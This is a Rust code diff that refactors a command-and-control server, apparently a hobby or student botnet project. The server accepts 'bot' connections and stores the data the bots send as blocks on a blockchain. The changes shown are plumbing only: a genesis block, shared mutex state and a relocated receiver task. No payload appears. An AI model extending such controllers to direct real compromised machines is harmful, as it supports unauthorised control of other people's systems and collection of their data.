@@ -38,7 +38,7 @@ use crate::{
     },
     blockchain::{
         blockchain,
-        block::{Block, BlockData, BlockHeader},
+        block::{Block, BlockData, BlockHeader, Genesis},
         blockchain::Blockchain
     }
 };
@@ -159,29 +159,32 @@ fn client_input (
 /// Receiving the data from the bot and sending it to the HQ
 async fn receive_bot_data(
     mut bot_rx: Receiver<c2::Device_stream>,
-    mut M_Blk: Arc<Mutex<Blockchain>>,
+    mut arc_Blkchain: Arc<Mutex<Blockchain>>,
+    mut arc_Blk: Arc<Mutex<Block>>,
 ) -> io::Result<()> {
-    let mut BH: BlockHeader = BlockHeader::new();
-    let mut BD: BlockData = BlockData::new();
     loop {
         match bot_rx.try_recv() {
             Ok(mut received_data) => {
-
                 println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);
 
-                if let Ok(mut Blk) = M_Blk.lock() {
-                    BH.create_block_header(Blk.get_last_block_hash());
-                    BD.create_block_data(received_data);
-                    Blk.add_block(Block::new(BH.clone(), BD.clone()));
-                    println!("Block added to the blockchain");
-                    // print the blockchain
-                    println!("{:?}", Blk);
+                if let Ok(mut Blkchain) = arc_Blkchain.lock() {
+                    if let Ok(mut Blk) = arc_Blk.lock() { // lisandro : clearable
+                        let mut BH = Blk.header.clone();
+                        let mut BD = Blk.data.clone();
+                        BH.create_block_header(Blkchain.get_last_block_hash());
+                        BD.create_block_data(received_data);
+                        Blk.update_block(BH, BD);
+                        Blkchain.add_block(Blk.clone());
+                        println!("Block added to the blockchain");
+                    }
+                    println!("{:?}", Blkchain);
                 }
             },
             Err(err) => {
                 // edode : empty channel
                 //println!("Could not receive data : {}", err);
             },
+            _ => {}
         };
     }
     Ok(())
@@ -195,19 +198,29 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
     let (chn_c2_tx, mut _chn_c2_rx) = broadcast::channel(64);
 
     let mut Co: c2::Cohort = c2::Cohort::new();
-    let mut Blk: blockchain::Blockchain = blockchain::Blockchain::new();
-    // lisandro : make this more generic
+
+    let mut Blk: Block = Block::genesis_block();
+    let mut Blkchain: blockchain::Blockchain = blockchain::Blockchain::new(Blk.clone());
+
+    let Blkchain_arc = Arc::new(Mutex::new(Blkchain));
+    let Blk_arc = Arc::new(Mutex::new(Blk));
+
     let c2_input_rx = chn_c2_tx.clone();
     thread::spawn(move || {
         client_input(c2_input_rx);
     });
-    let Blk_arc  = Arc::new(Mutex::new(Blk));
+
+    let mut bot_rx = chn_bot_tx.subscribe();
+    tokio::spawn(async move {
+        receive_bot_data(bot_rx, Blkchain_arc, Blk_arc).await;
+    });
 
     println!("C2 Server Initialized");
     loop {
         // edode : Accepting the new bot
         let (socket, addr) = listener.accept().await?;
-        let mut Blk_arc_c = Blk_arc.clone();
+
+
         println!("New user connected: {}", addr);
 
         Co.append_C2_Stream(authenticate_new_user(&socket, addr).await);
@@ -218,7 +231,7 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
 
         let mut co_clone = Co.C2_Stream.last().unwrap().clone();
 
-        let mut bot_rx = chn_bot_tx.subscribe();
+        //let mut bot_rx = chn_bot_tx.subscribe();
         let bot_tx = chn_bot_tx.clone();
 
         let mut c2_rx = chn_c2_tx.subscribe();
@@ -226,10 +239,6 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
 
         tokio::spawn(async move {
             handle_message_from_client(co_clone, bot_tx, c2_rx, socket).await;
-        });
-
-        tokio::spawn(async move {
-            receive_bot_data(bot_rx, Blk_arc_c).await;
         });
     }
     Ok(())
